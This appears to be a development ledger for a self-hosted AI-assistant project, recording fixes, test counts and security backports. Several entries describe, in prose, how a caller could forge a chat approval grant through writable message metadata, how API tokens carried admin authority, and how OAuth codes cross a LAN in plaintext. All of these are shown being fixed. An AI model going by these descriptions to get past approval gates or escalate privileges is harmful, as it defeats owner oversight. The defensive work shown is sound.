That is the answer to *can agents spawn agents*: they can, and each was told it may, for reading —
but one writer per tree, because parallel writing and `Law 19` cannot both hold. One collision on
merge: two agents independently claimed the number `B75`, and one was renumbered `B78`.
**`B21` is the row `D-2026-09-14-03` exempted, and the defect was one layer deeper than filed.**
The four `src/` key lists are gone, derived from the editor's own `ADV_KEYS` — which looks like a
fragile coupling and is the opposite, since `create_theme` has no effect of its own and only emits
an event `theme.js` applies. And **no `else` on the parse loop could have fixed the silent drop**:
`function_call_to_tool_block` filtered the key out before the validator ever saw it.
**`B05`'s premise was false and could never be satisfied** — `.pdf` in a text-file test is a bug.
The real invariant named a third register the row never mentions, and holds now by construction
rather than by a checker. Its `[Attached non-text file]` banner **was already on screen**; what it
was not was informative, which changed the fix from *surface it* to *make it say something*.
**`B07` had a `Law 1` trap and a second one nobody had seen**: the status flip would have removed
Run-again and Copy from the row, and the card badge would have rendered a privilege refusal as a
green tick.
**`B02`/`B03`: the row understated it.** Rejected uploads did not merely vanish — the surviving
files were paired to their chips *positionally*, so a partial batch put **the wrong thumbnail under
the wrong filename**. And `window.showToast` is read in three files and assigned in none, so two
`chatRenderer` toasts have never once fired.
Across the four: 74 mutations run, 74 caught, and **seven survived a first pass and were fixed by
strengthening the test, not the mutation** — including one sweep that derived its expectations from
the register under test, so emptying that register emptied the sweep.

### An argument that ended the run, a gate that asked the wrong question, and a plan that lasted one turn
`8e623ea..HEAD`. **382 tracked, 190 done. 0 new phase rows, 0 regressions. `B06`, `B17` and `B19`
closed; `B15`, `B16`, `B22` and `B23` ruled by the owner (`D-2026-09-14-03`); the backlog sits
outside this tally.**
**`B17`.** `json.loads` raises `RecursionError` on a deeply nested argument, and `RecursionError` is
a `RuntimeError` — named by neither `TypeError` nor `ValueError`. It escaped the classifier, escaped
**six** unguarded call sites (the row names two), and stopped at `agent_runs.py`'s outer handler,
which ends the run. The consequence the row never states is the worse one: `save_assistant_response`
is *inside* the `async for` body, so **the turn's reply is discarded** while the user's message is
already saved. And 1,984 was never a constant — bisected, it is `2 × (limit − frames − 4)`, a
property of the interpreter. Fixed at the one choke point with a depth bound checked **before**
parsing, by a scanner that does not itself recurse — proved by shrinking the interpreter's limit to
60 and scanning 500 levels. Bound on depth, not length, so a 50 KB flat argument still works.
**`B19` contained a false correction, and a test was guarding the wrong constant.** The row claimed
`manage_notes`/`manage_memory` keep `write_private` at the gate and would stay gated anyway; they do
not — `capabilities_for_action` **replaces** rather than unions for a read action. A test asserting
the row's version would have blocked the fix on a premise nobody measured. Meanwhile
`test_trust_ladder_js` bound the UI copy to `READ_PRIVATE in POST_EXTERNAL_BLOCKED_EFFECTS`, which
is still true and must stay true — **so it would have gone on passing while the copy it guards
became false.** The strict rungs now consult a derived `RUNG_BLOCKED_EFFECTS` while untainted; the
post-external set is untouched and applies in full from the first private read, which arms the gate.
Only the *first* read stops asking, and the row now says so, because promising more than a fix
delivers is how the next person gets surprised.
**`B06`'s `Verify` line passes today and always did.** It asks for the checklist on all four
*rounds* — and a round is a tool iteration inside one request, where the verifier instruction is
built once above the loop. The defect is about **turns**, and the verifier is the least of it: on
turn two the agent lost the plan it was executing, lost agent-mode forcing, and on a local
finetuned model lost its tool schemas entirely. The fix deletes the copy rather than refreshing it —
it was a second plan store and the only one that did not survive a reload.
**The owner ruled the palettes decorative** and the reasoning is worth keeping: a theme here is data
a person edits, so a default that reads badly is a default somebody changes in thirty seconds. The
measurements stand — `cute` 3.44, `retrowave` 4.15, `--green` on `paper` 1.37 — and `B16`'s headline
turned out false on its own numbers. **`B21` is exempted from that ruling and stays worked**,
because it is the customiser rather than a palette: `create_theme` accepts four keys no writer
writes, reports *"with N advanced overrides"* counting them, and silently discards the two real keys
it does not know. *They're all customizable* has to be true for the rest of the ruling to hold.
59 tests, 13 mutations, all caught.

### Five stated guarantees, and what measuring them actually found
`d5dea9d..HEAD`. **382 tracked, 190 done. 0 new phase rows, 0 regressions. `B09`, `B10`, `B18`,
`B25` and `B58` closed; the backlog sits outside this tally.** Five investigations run in parallel,
the landings serial. **Three of the five rows had a premise that had rotted, and two of those named
the wrong file** — which is the return on checking a premise before working it.
**`B18` blamed the wrong test.** `test_agent_loop.py` cleans up after itself and breaks nothing;
prepending it changes the failure set by zero. Six *other* files stub `sys.modules["src.agent_tools"]`
with a `MagicMock` at module scope and never restore it — and `agent_loop`, `tool_parsing` and
`tool_schemas` bind `TOOL_TAGS`, `ToolBlock` and `parse_tool_blocks` **by value** at import, so the
mock is baked into three more modules for the life of the process. The full suite is green for one
accidental reason: `test_a_refused_call_leaves_a_trace.py` sorts first and imports the real module,
which makes all six `if mod not in sys.modules` guards dead code. **The count was low, not high** —
6 failures and **12 runaway processes**, because a mocked `parse_tool_blocks` never satisfies the
loop's exit condition and `max_rounds=2` is lifted to 100,000 for a local endpoint: the subset was
OOM-killed at 6 GB. One line in `conftest.py`, and a collection-time guard so the seventh
copy-paste fails loudly.
**`B10` blamed the wrong command, and the real one was worse than weakened.** The release gate was
never broken. CI's own loop ran `node --check` over a *path*, and node picks module type from the
nearest `package.json` — so `static/app.js` parsed as CommonJS, and node's module-syntax detection
retried the failed parse as ESM **and did not re-check**. Not a weakened check: **disabled**. A file
whose entire body is `this is not javascript at all !!! ( [ {` passes as long as it contains an
`import`. Measured on node 20 and 22, on 4,641 lines. And the loudest claim was not in `AGENTS.md`
where the row pointed — `docs/security-ci.md` lists that step as a **required, merge-blocking status
check on `main`**. One list now, 174 files → **187**.
**`B09` and `B58` were one defect and the fix was an existing checker.** `check-specifiers.py` has
enforced *one query string per module path* at `--max 0` since `P3-11` and reported `FORKED 0` the
whole time, because it read four of the six places a URL is written here. Two regexes —
`modulepreload` links and the service worker's precache list — and it reports **four**. Three of
them are a defect no row had named: `admin.js`, `emailInbox.js` and `sidebar-layout.js` precached
**bare** while every importer used a version, and `sw.js` matches without `ignoreSearch`, so they
were downloaded at install and could never answer a request. Third recurrence of what `P3-11` and
`B54` each fixed. The ledger's `0 forked` was restated: **a ratchet is only as honest as the set it
counts.**
**`B25` was already decided and the row had not caught up.** `D-2026-09-08-06` ruled the false
§13 line comes out *now* — a changelog is what a stranger reads to audit conformance, and a false
compliance claim is worse while the repo is private, because nobody can check it. Withdrawn in
place, not deleted. The framing is corrected too: §13 attaches to whoever offers a modified version
over a network, and this repo is private on a loopback bind, so nothing was out of compliance —
what was wrong was the sentence.
`Law 20` bit three times in one push and each time the test was repaired rather than widened: a
regex that matched `Tool(name="…")` out of source, a grep for `ignoreSearch` that failed on the
comment explaining why there is no `ignoreSearch`, and a `node --check` probe placed in
`static/js/` — where `{"type": "module"}` means it **cannot tell the fixed gate from the broken
one**. A mutation run found the last of those. 42 tests, 20 mutations, all caught.

### The agent could not CC anybody
`4407a61..HEAD`. **382 tracked, 190 done. 0 new phase rows, 0 regressions. `B74` closed; the
backlog sits outside this tally.**
Filed as *thirteen schemas spelled twice*, which was too kind a description. Every tool an
`mcp_servers/*.py` serves that Pantheon also declares carried two hand-maintained copies, and an AST
comparison said **no pair matched**. Merging them found the drift had already cost capability:
`send_email` accepted `cc` and `bcc` in the handler and declared them on the server, and **both
registers the model reads named neither**. Same for `reply_to_email` and `reply_all`. `read_email`
demanded a `uid` the handler does not require and never mentioned the `message_id` it accepts.
`B66`'s shape, arriving through a schema written twice instead of a tag left out.
The prompt was fixed with the schema, because **for email the prompt is the live register**: bare
email fences route to the MCP server through `BUILTIN_EMAIL_TOOLS` and built-in Python servers are
skipped from the function schemas, so a parameter added to the schema alone would still have been
unreachable. Twenty-one machine-readable `default` values came across too — *"IMAP folder (default:
INBOX)"* is a sentence; `"default": "INBOX"` is something a client can act on.
One source (`src/tool_schemas.mcp_tool_schema`) and three servers deriving. The direction was forced
rather than chosen: `mcp_servers/*` already import from `src/`, and the reverse would drag
`mcp.types` into the register every tool channel reads. **`Law 1` is held on a diff, not a claim** —
the served schemas were captured from `git archive HEAD` and compared after: 19 tools both sides, no
property dropped, no default dropped, no `required` tightened, one gained.
An **eighteenth checker** that asserts *derivation* as well as equality, because a hand-written
schema that happens to match today is exactly the state this row started in. It compares by calling
`list_tools()` rather than reading the file — `email_server` builds its schemas at runtime, and a
server that builds a schema is still serving one (`Law 20`). 9 tests, 9 mutations, all caught,
including the retyped-but-equal case.

### A server that was started every morning and could not be called
`72506f5..HEAD`. **382 tracked, 190 done. 0 new phase rows, 0 regressions. `B67` closed;
`B74` filed to the backlog, which sits outside this tally.**
`B67` set its own bar — *route to it or stop connecting it, and write down why* — so the work was a
decision, not a patch. **It stops being connected**, and `B66` is the reason the answer is not
`B66`'s answer. There, the in-process `manage_rag` was a *third, smaller* form missing the action
the system prompt promised, so routing to the server gained a capability. Here the two forms are the
same size — same five actions, same four properties — so routing gains nothing and **costs**: the
main process builds its own `MemoryVectorStore` and reads it during a turn, so a write sent to a
subprocess leaves this process's index stale until a reload. **Routing would have turned dead weight
into a stale read**, which is the worse of the two ways to be wrong, because dead weight is
measurable.
`P17-08`'s figure — offered 22, called **0** — is corroboration and not the argument. The argument
is in the dispatch chain, and the distinction matters: a zero can mean *nobody wanted it*, and this
one means *nobody could*. `Law 1` holds without strain — the file stays, `manage_memory` is offered
and dispatched exactly as before, and the server still runs standalone, which the tests prove by
**calling** `list_tools()` rather than reading it.
`check-tool-surface.py`'s exemption table is now **empty**, and checked load-bearing: re-adding
`memory` to `_BUILTIN_SERVERS` fails the checker by name. Two of the eleven tests guard the
*premise* rather than the change — if either form gains an action the other lacks, the reason this
server was disconnected fails loudly instead of quietly expiring.
**Removing one dict entry found a second list.** `McpManager.is_builtin` carried the four ids as a
literal and went on saying `True` for `memory` — and `True` there **mutes a server**: built-in
Python servers are dropped from `get_all_openai_schemas` and from the prompt's MCP descriptions,
which is the mechanism that made this tool unreachable to begin with. Someone registering *their
own* server under the id `memory` — the canonical upstream memory server's id — would have lost its
tools from both call channels silently. `B66`'s failure mode, arriving through a stale literal.
It derives now.
`B74` came out of the same measurement. Every tool an MCP server shares with `FUNCTION_TOOL_SCHEMAS`
carries two hand-written schemas, **thirteen of them, and an AST comparison says no pair matches**.
`manage_memory` differs in wording only, which is the point — the drift starts cosmetic. `manage_rag`
is already past that: the sentence `B66` landed to make the tool findable is in one copy and absent
from the other, and the copy that rots is the one Pantheon never runs, read only by the third-party
client `D-2026-09-14-01` just made a supported way in. 13 tests, 9 mutations, all caught.

### One clipboard helper, and two buttons that were lying
`d2a2f8f..HEAD`. **382 tracked, 190 done. 0 new phase rows, 0 regressions. `B59` closed;
the backlog sits outside this tally.**
Filed as *three implementations of copy-to-clipboard*. There are **eleven** files with their own
`execCommand` copy, **nineteen** touching `navigator.clipboard`, across **twenty-three** call sites
— and two had no fallback at all, both on the deployment `Law 17` calls normal. **`admin.js`'s
API-token button** threw on the property access over plain http, copied nothing and said nothing,
on the one control that shows a token once. **`tasks.js`'s webhook-URL button** did the same and
then said `Copied`, about a URL the line above it warns to rotate if it leaks.
One `copyText` in `ui.js`, `execCommand` first so the copy lands inside the user's gesture;
`copyToClipboard` stays as the toasting wrapper its thirteen callers rely on. **The proof is a
harness, not a grep** — the row's own `Verify` asks that the gesture path be *synchronous*, which
cannot be read out of source, so the test calls `copyText` and **does not await it**, then looks at
what already ran. That found something reading would not have: `ta.remove()` was the last statement
of the `try`, so an `execCommand` that throws leaked an off-screen textarea per failed copy.
A **seventeenth checker** rather than a nineteen-file sweep, ceiling zero. And the ledger's own
`checkers` claim said *fifteen* against a CI file listing seventeen — drifted twice, because the
number lived in prose and nothing compared it to the list. It is counted now. 20 tests, 10
mutations, all caught, including the shared wrapper claiming a success it did not have.

### The owner asked whether it was necessary, and the answer was a live defect
`c5b54de..HEAD`. **382 tracked, 190 done. 1 new phase row (`P18-09`), closed the same turn.
`B73` filed to the backlog. 0 regressions.**
The question was *"these are all intended to be self hosted within their own systems/network etc..
so is it really necessary?"* — and checking it found that `P18-07` had written a comment saying the
app-password path must not be deleted, three lines above the statement that deletes it.
`.uf-password-section` lives **inside** `#uf-manual`; setting the child visible and then the parent
to `none` hides it. **The comment names the exact outcome it is protecting against**, which is why
nobody caught it — this repo reads files to check browser behaviour, and the file said the path was
safe. The cost was the owner's point exactly: choosing Gmail left *register an application with
Google Cloud Console* as the only road, for installs where pasting an app password is thirty
seconds and needs nothing set up at all. One sentence and one button fix it, sticky because the
sync re-runs on every keystroke, and offered **only where a password can actually work** — Google
issues app passwords, Microsoft has disabled basic auth in every tenant, and that is a fact about a
provider so it lives on the record. The default is `True`: most mail servers take a password, and a
self-hosted Dovecot needs none of this machinery. 12 tests, 8 mutations, all caught.

### The setup steps are beside the button now, not in a file nobody has open
`f1ac32d..HEAD`. **381 tracked, 189 done. 1 new row (`P18-08`), closed the same turn. 0 regressions.**
The owner: *"Ensure the enrollment of these systems is straight forward and not confusing as fuck
to any end user."* The end user's half was already one button. **The operator's half was a sentence
naming two environment variables** — the destination and none of the journey — with the actual
instructions in `.env.example` and a docs file, neither of which is open at the moment the button
is greyed out. Four numbered steps now render beside it: console link, redirect URI, scopes, `.env`
block, each with a copy button and **all four served from the provider record**, so a provider
added later gets a correct walkthrough nobody wrote. A half-configured install is told which half
is missing rather than shown the whole thing again.
**The renderer is run rather than read**, against a stub DOM — and it paid for itself immediately:
the `.env` block's newlines survived into the copied value and rendered as one run-on line, because
`\n` inside `<code>` collapses without `white-space: pre-wrap`. A substring check would have
passed. **Two `Law 13` copies fell out**: the outlook note spelled both Microsoft variables a third
time, and the clipboard handler was bound to one box with a `contains()` check, so every new copy
button would have silently done nothing. Two tests now assert no scope string and no OAuth variable
name appears in the browser at all. 16 tests, 10 mutations, all caught.

### PKCE, and an interceptor who holds ciphertext
`690b483..HEAD`. **380 tracked, 188 done. 0 new rows, 0 regressions. `P18-06` closed, `P18` clear.**
The owner decided, and the reason is sharper than the textbook objection: MITM is normally TLS's
problem, which assumes the redirect leg has TLS on it — and **in this product it frequently does
not, by design.** `P18-04` made direct access first class and keeps a test whose job is to stop a
proxy-shaped fix breaking `http://192.168.1.71:7000`, so on those installs `?code=…` crosses a LAN
in plaintext and the only thing stopping an interceptor redeeming it is one secret in one `.env`.
Their second argument settles it on its own: the documentation now says we know, in a repository
meant to go public, and an acknowledged weakness that ships unfixed is worse than an unknown one.
**The design constraint was staying stateless.** The verifier must outlive the redirect and the
state envelope keeps no server-side record — so putting the verifier in it would have defeated
PKCE outright, since whoever catches the code catches the state beside it. It is **encrypted**
into the state and the state is still signed: the interceptor holds ciphertext, and the HMAC still
stops the account id being forged. Both, not either. **Provider support was read out of the
servers rather than their prose**, because Google's web-server page never mentions PKCE — its
discovery document advertises `S256`, while Microsoft's discovery document omits the field
entirely and its prose recommends the parameters. The two disagree in shape, and the record says
which source each answer came from. 19 tests including RFC 7636 Appendix B's own vector, 11
mutations, all caught — among them the two that matter: signing instead of encrypting, and a
challenge that is the verifier.

### `P18-06`'s premise was wrong, and the correction improves the question
`5b87240..HEAD`. **380 tracked, 187 done. 0 new rows, 0 regressions.** Owner asked for `P18-06`
elaborated. Reading the two files it cites found that **neither is Pantheon doing PKCE**:
`mcp_oauth.py` has no `code_challenge` at all and inherits it from the vendored SDK, and
`chatgpt_subscription.py` receives a verifier from OpenAI's device-code endpoint rather than
generating one. There is no `code_challenge` anywhere in this tree's own source, so the row's
*Google is the odd one out* framing does not hold and the real question is whether Pantheon
implements PKCE for the first time. **The cost objection also fell**: the verifier must outlive the
redirect and the flow is deliberately stateless, but encrypting it into the signed state envelope —
with machinery `secret_storage` already provides — keeps it stateless and still defeats an
interceptor, who ends up holding ciphertext. That puts it at about fifteen lines. **The fork worth
the owner's attention is not *add PKCE* but *confidential or public client*** — a public client
makes Connect work with no Cloud Console registration at all, which is `P18`'s remaining `Law 15`
friction, and makes PKCE mandatory rather than optional. Surfaced with three options and a
recommendation; no code written, because that half is the owner's.

### Both tool channels, in one receipt
`cd64e87..HEAD`. **380 tracked, 187 done. 0 new rows, 0 regressions. `P17-12` closed.**
The finding that reframed yesterday's analysis, closed the day after it was filed. `run_config`
records `fenced` beside `tools`, computed in one place so the prompt and the receipt cannot
disagree, and **an empty fenced list is written rather than omitted** — the compact prompt forbids
tool syntax in chat, so `[]` means *this channel was deliberately shut* where `None` means *nobody
looked*. **Two more defects fell out of writing it down.** `receipt()` replaced rather than merged,
so a run whose config was written from two places — sampling and schemas from `stream_llm`, skills
and the fenced list from the prompt builder, each captured where its value is resolved — kept only
whichever landed last; a turn that injected skills *and* sent schemas could show one or the other,
never both. And the analysis counted config rows as runs, where a run can now write two.
**One mutation survived and deserved to**: replacing the shared read with the inline expression it
came from is behaviourally identical today. That is not evidence the sharing is pointless, it is
evidence every test pinned the value and none pinned the link — so the test written for it narrows
the fenced set and asserts the prompt narrows with it. 13 tests, 7 mutations, all caught.

### A failure that says which of four fixes it needs
`113c4a1..HEAD`. **380 tracked, 186 done. 0 new rows, 0 regressions. `P17-13` closed.**
Yesterday's analysis found seven of eight failed tool calls recording that they failed and never
why, and the cost was concrete: `web_fetch` offered 37 times, called 3, failed 3, with no way to
tell a blocked host from a timeout from a parse failure from a dead URL. Four different fixes,
indistinguishable in the rows. Failures now carry **a class and a redacted first line** — the class
is what a count can be taken over, the line is what a person reads when the class is `unknown`.
**The ordering of the nine classes is the design**: `blocked` before `permission`, because an SSRF
refusal and a 403 both say *not allowed* and the difference is whether this app refused or the far
end did; `timeout` before `network`, because a timeout is a network error with its own fix.
**The redaction is load-bearing rather than decorative.** A `web_fetch` failure echoes the request
it made, and a request carries an `Authorization` header — into a table with a 90-day prune that
rides diagnostic bundles. It uses the support bundle's own redactor, and a redactor that raises
drops the line and keeps the class, because failing open there puts the unredacted string in its
place. **The classifier was wrong until it was run over this codebase's messages rather than
imagined ones**: `Expecting value: line 1 column 1` is `JSONDecodeError`'s own text and contains
none of the obvious words. And the empty `capability_gap` row had exactly one cause — one of three
reason shapes carries no `pattern` token — so the branch that fired is now recorded beside the
pattern, both still source text, with the no-conversation promise pinned by a test carrying a real
payload. 34 tests, 9 mutations, all caught.

### The gap analysis, run against real traffic — and the first explanation was wrong
`1dc03f5..HEAD`. **380 tracked, 185 done. 3 new rows (`P17-12`, `P17-13`, `P17-14`), 0 regressions.
`P17-08` closed.**
`P17-08` was filed saying the analysis could not be written from this tree — 0 sessions, 0 chat
messages, 1 `events` row — and that the corpus lived on one running deployment. It does, and it is
up: 14 sessions, 48 user messages, 40 runs, 45 tool calls. **The script is the artifact, not the
document**, because a page of figures from a database nobody else can open is exactly the *trust
us* this fork's ledger refuses; it takes a read-only snapshot, refuses to open a database
read-write, and prints no message content.
**The sharpest finding is that the measurement was measuring one of two things.**
`create_document` was called 19 times and in **17 of them was not in its own run's offer**, against
0 mismatches for every other tool — the fenced tool channel, which `run_config` does not describe.
So *offered and never picked* is about the schema channel only, and the deployment's most-used tool
is not in it. Two more: seven of eight failed tool calls record **no reason at all**, which makes
`web_fetch`'s 37-offers / 3-calls / 3-failures undiagnosable; and selection offers a median of 11
of 81 tools per run, so the offer column measures the selector, whose top pick (`web_search`, 37
offers) was never called once.
**And a correction.** Chasing the first finding, I wrote that the cause was a latch in
`_capture_run_config` — and committed that explanation before checking it. Measuring said
otherwise: 39 of 40 runs recorded a tool list. The latch bug is real and readable in the source, so
it is fixed as a latent bug found while chasing something else, but **the claim that the data
proved it has been withdrawn from every place it reached** (`Law 9` — that number was not mine to
quote). 11 tests.

### Upstream's newest fix, and the two neighbours it left behind
`9e3184d..HEAD`. **377 tracked, 184 done. 1 new row (`P19-08`), 0 regressions.**
`git fetch upstream` moved `934d23c0 -> 9d5c0319`. Eight commits have no patch-equivalent here;
seven are docs, deps and the advisory merges already carried by hand as `B70`, and one is a fix:
**`#6215`, reject malformed Args on Add MCP Server instead of silently defaulting to `[]`**. Taken
under `P19-06`'s standing answer, *"cherry-pick fixes, skip the rest"*. **Upstream's own reasoning
is the interesting part** — *an unparseable value is silently discarded downstream, so the caller
must be told instead* — and it does not stop at `args`: one line below it `env` did the same, and
four lines below that `oauth_config` did it with a bare `pass`. Three fields, one defect, and the
failure each produces looks like something else entirely: an empty argv reads as a broken package,
an empty env as a bad token, a dropped OAuth config as the provider refusing. The typo is the one
explanation nobody reaches for, because the panel said the server was added. All three now go
through one validator. The Admin panel never checked Args and never read `res.ok`, so a rejected
request took the same branch as an accepted one and cleared the form either way — the refused
values gone before anyone could see which was wrong. 16 tests, 9 mutations, all caught.
**And a third pinned figure, in the same file as the first two.**
`test_a_cherry_picked_fix_stops_counting_as_behind` built its fixture as *seven absent, five
equivalent* with the seven typed in — so the moment upstream moved to eight it failed on a checker
that was working correctly. It derives the count from the claim now, and asserts the failure path
as well as the passing one, which caught something else: the checker's own message still named
`git rev-list`, **the command this check was corrected away from** — it would have sent a reader
to reproduce the wrong number.

### The ledger gains the mailbox claim, measured on the box that can measure it
`f2a81b1..HEAD`. **376 tracked, 183 done. 0 new phase rows, 0 regressions. `B72` closed the same
day it was filed.**
`B72` was filed because this container's clone bottoms out 147 commits deep at a cybertooth
baseline, with no `upstream` remote — so the fork point `b4d1293` is unreachable here and `Law 9`
says a row does not close on a number that cannot be checked. The bridge to cybertooth was up, so
it was measured there instead of deferred: `"google"` written **nine** times in
`routes/email_routes.py`, two hand-written OAuth routes, **seven** Microsoft mentions in
`routes/email_helpers.py` — every one an error saying it cannot be used — and **eight** integration
presets carrying `auth_type` of `bearer`, `header` or `none` only, which is why none of them could
describe a sign-in. The ledger gains an eleventh area, **Mailboxes and providers**, and its
twenty-sixth claim, `providers-are-records`, provenance `diffed`. **The repro was run end to end on
cybertooth** and returns those figures; its last step does not run there because that box has no
`pytest` installed, which is said out loud rather than trimmed out of the command.

### Microsoft, and a provider that is a record rather than a flow
`09a66ff..HEAD`. **376 tracked, 183 done. 0 new phase rows, 0 regressions. `P18-05` closed;
`B72` filed to the backlog, which sits outside this tally.**
`src/providers.py` holds one record type for *a thing you sign in to*; a mailbox is that record
with a `mail` block and a service is the same record without one. Google was written down in
nineteen places and Microsoft would have been a second copy of each. The proof is not a grep
(`Law 20`): a test invents a provider called `acme`, inserts the record at runtime, and drives the
served list, the authorize redirect, the transport guards and the refresh table with no module
edited. The registered callback URL is byte-identical to before — a Google Cloud Console entry
holds that string literally, and a rename would have broken every existing install with a
`redirect_uri_mismatch`. **Three things Microsoft taught the record**: two SMTP hosts against one
IMAP host, an address that comes from the `id_token` because Entra will not put Graph and the
Outlook resource scopes in one token, and a vendor that is two records when the platform API is a
key and the subscription is a sign-in. 38 new tests, 23 mutations, all caught — two survived the
first run and both were rules that were true and untested. **`check-env-declared.py` refused the first shape** — names
composed from a prefix meant `MICROSOFT_OAUTH_REDIRECT_URI` was declared in `.env.example` and
appeared nowhere in the source, so an operator could set it and never find out it did nothing.
Anthropic and OpenAI are `api_key` records and say so; giving them an `authorize_url` for symmetry
would have been a lie (`Law 9`). Two places that told people Microsoft was unsupported now tell
them how to use it.

### The same pinned figure, in the test next door
`71ea0dc..HEAD`. **376 tracked, 182 done. 0 new rows, 0 regressions. Suite 8,819, 0 failing.**
`test_readme_drift_is_caught` typed `tests-8%2C642%20passing` into its own `.replace`. The suite
grew to 8,819, the badge moved with it, the `.replace` matched nothing, the README stayed valid,
the checker correctly reported no problem — and **the assertion failed for the opposite of the
reason it was written**. This is the identical defect already fixed once this sitting in
`test_tracker_total_drift_is_caught`, four lines further down the same file, whose docstring
records the lesson verbatim. Fixing one instance of a defect class and leaving its neighbour is
`Law 13` in miniature. Both now derive the figure from the ledger claim they are testing against,
and both assert the *current* value is present before mutating it — so a stale pin fails loudly on
the first line instead of silently on the last. The ledger's own `add-never-subtract` prose also
still read *minus four files* under a headline saying *Five removed*; corrected, with the fifth
(`docs/pantheon-wordmark.png`) named in the test's deleted-file list.

### The suite is green — fourteen standing failures, and eight were never failures
`30dcd0d..HEAD`. **376 tracked, 182 done. 0 new rows, 0 regressions. Suite 8,796 -> 8,819, and 14 -> 0 failing.**
Every run in this fork's life has compared against a list of fourteen. They are gone, and the
accounting matters more than the number.
**Eight were this container missing dependencies the project already declares.** `icalendar` is in
`requirements.txt` and `markitdown[docx,pptx,xlsx,xls]` in `requirements-optional.txt`; CI installs
the first, so seven caldav tests would always have passed there, and the markitdown one would have
**skipped**. They were never defects — they were a baseline measured on an incomplete environment
and then carried as if it described the code. Worth saying plainly rather than counted as fixes.
**Three were stale test stubs, and the same one.** `_probe_lmstudio_models` and
`_query_context_length` both gained a `headers=` argument for endpoint auth; three stubs written as
`lambda url, timeout=None` did not. Each call raised `TypeError` straight into a broad
`except Exception`, so the probe returned `None` and the assertion read as a **logic** bug in
vision detection and context sizing. The tell was that the one test expecting `None` kept passing —
which is why it looked like isolated failures instead of a dead stub.
**One was a rule written as the wrong shape.** `tool_utils` may import nothing from the project
except `src.constants`, because it exists to break a cycle — and `src/runtime_limits.py`, whose own
docstring says *"imports nothing from the project (stdlib only), so it is safe to import anywhere,
including lazily from src.tool_utils"*, failed a rule it provably satisfies. The rule is now the
**invariant**: follow every `src.` import transitively and the closure must never return to
`tool_utils`. Written first at depth one, which failed immediately — `src.constants` imports
`src.runtime_paths`, so the allowlist had been hiding that its one permitted module was not a leaf.
**Two were pinning upstream's identity against a decision this fork had already made.** The README
guard wanted a wordmark image; `P0-13` says *"do not reuse … the wordmark — the licence grants them
but they are upstream's identity"*. And the orphan-image guard was right the whole time:
`docs/pantheon-wordmark.png` was referenced by nothing **because it was upstream's mark renamed and
never repainted** — the filename said Pantheon, the pixels said Odysseus. Removed; the guard now
pins the intent and still accepts an image the moment there is an honest one. `B71` filed for the
rest, including `build-macos-app.sh` using `docs/pantheon.jpg` — a screenshot of the old UI — as the
**macOS app icon**. `check-fork-names.py` reported zero references throughout, correctly: it reads
text, and these are pixels.
**The ledger's limitations section loses its fourteen-failures line and gains a better one**, because
a green suite is evidence about the code under it and not about a deployment.

### P19-06 — five upstream fixes, and the eighteen conflicts that never happened
`18416dc..HEAD`. **376 tracked, 182 done. 0 new tests written, 8 inherited, 0 regressions. Suite 8,788 -> 8,796.**
The owner chose cherry-pick over merge, and the conflicts **vanished rather than being resolved**:
all 18 were in files the five fixes never touch. Every one applied clean. **Authorship stays
upstream's** — `rauljua`, `Vykos`, `daixiheguu`, `cybernetus@xda`, `RaresKeY` — carried with
`cherry-pick -x` so each commit names the sha it came from; this fork re-authors every other sync to
the owner because that work is the owner's, and doing it here would be the one place the habit
becomes a lie. Two of the five brought their own test files, so the suite rose by eight without us
writing a line. **`#6228` is the interesting one**: a Tailscale lookup that succeeded and returned
nothing was not cached, so the empty answer was re-fetched every time — `P15`'s whole subject,
arriving from upstream, which says the concern is shared rather than ours. **And our SPDX checker
failed the gate on upstream's two new test files**, which ship with no licence header at all: a
concrete instance of the ledger's *verification apparatus* claim doing work on code that is not
ours. Behind-by-N is **12 → 7**, and the ledger's live `git rev-list` check will fail until it says
so, which is the mechanism working rather than a chore.

### B70 — the backport, and the forgery an existing test was performing
`0dd3904..HEAD`. **376 tracked, 181 done. 38 tests, 24 mutations, 0 regressions. Suite 8,750 -> 8,788.**
Taken now rather than deferred, on the owner's parenthesis: *"there **is** no external connection
(yet - I may tailscale this out one day…)"*. That is a correct read of today's risk and the reason
the backport is **cheap**, not the reason it is unnecessary — a control added now costs one session;
the same control added the week the box reaches a tailnet costs a decision made under pressure by
somebody who has to remember it exists. **And one half never depended on exposure at all**: the
approval grant was derived from caller-writable message metadata, which is a confused deputy on an
ordinary authenticated route — *no external connection* does not help when the caller is already
inside. It is HMAC-signed now and fails closed. **An existing test had been performing that forgery
without meaning to** — it hand-wrote a resolved card and expected it honoured, which is the clearest
possible evidence the path was open; it now resolves the way the server does. Mutation testing found
three real gaps: the `\x00` separator is the whole canonicalization (`("ab","c")` and `("a","bc")`
otherwise sign identically), the hex guard is what stops `compare_digest` **raising** on non-ASCII,
and one survivor was a mis-anchored mutation rather than a missing test. Two are equivalent and one
— constant-time compare — is timing rather than behaviour and is named as untestable instead of
being given a flaky test.

### B70 filed — upstream shipped a security fix and we do not have it
`2a54779..HEAD`. **376 tracked, 181 done. 0 new tests, 0 regressions.**
Went to measure `P19-06`'s merge and found that two of the twelve unmerged upstream commits are
titled *"Merge commit from fork"* — GitHub's message for merging a **private security advisory** —
and read the diffs rather than the titles. `grep delegated_credential` returns nothing in this tree.
**A bearer API token carries its minting owner's authority**, which is `effective_user()` working
as designed for data and wrong for authority: minting is admin-only, so every token resolves to an
admin and every *is the owner an admin* gate answers yes for a credential handed to a third party.
**And a chat-session approval grant was readable back out of caller-writable message metadata** —
routes that persist a message on the caller's behalf took the blob verbatim, so a caller could write
the shape of a resolved approval into its own transcript and have the server read it as authority.
Upstream signs the grant with HMAC over `(session_id, approval_id, decision)`, fails **closed**,
refuses to stamp anything but an `approve`, and binds both ids so a signature cannot be replayed
between chats. That second one needs no token and is the one to read first.
**Backport, do not merge**: the full merge carries 18 conflicts over branding the fork renamed and a
rewritten README — judgement calls that belong to the owner and must not delay this. The change
**adds** controls to two `FORBIDDEN.md` Part 2 files, which is what that document protects rather
than forbids. Filed **needs the owner**, with the analysis written down rather than held in a head.
The ledger's limitations section is corrected: *twelve behind* was true and incomplete.

### B69 — 374 lines of a form that never ran, inherited from upstream
`5a28754..HEAD`. **376 tracked, 181 done. 6 tests, 0 regressions. Suite 8,744 -> 8,750.**
The second email-account form is gone, and `git log -S` on the deployment box settles where it came
from: upstream `ea2778d9`, *"Move email account management to integrations"*, removed the markup and
left the JavaScript — at the fork point the markup count is already 0. **Not wholly dead**: the
enclosing function wires three live buttons before it reached the unmounted ids and returned, so the
deletion stops at the corpse and a test asserts all three still have a handler and an element.
**The ceiling came down with it**, 124 → 120, which is what makes the deletion stick — leaving it
